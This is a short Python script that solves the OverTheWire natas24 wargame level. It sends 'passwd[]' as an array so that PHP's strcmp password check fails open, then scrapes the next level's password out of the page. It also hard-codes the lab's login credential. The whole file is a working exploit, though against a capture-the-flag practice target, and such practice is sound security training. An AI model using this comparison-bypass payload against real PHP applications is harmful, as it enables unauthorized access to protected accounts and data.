import requests
import re

def flag(url,username,password):
    site = requests.get(url+"index.php?passwd[]=dfas",auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    flag = re.findall("Password:(.*)</pre>",site.text)
    print("The flag for natas24 is: " + flag[0].strip())

if __name__=="__main__":
    url = "http://natas24.natas.labs.overthewire.org/"
    username = "natas24"
    password = "0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r"
    flag(url,username,password)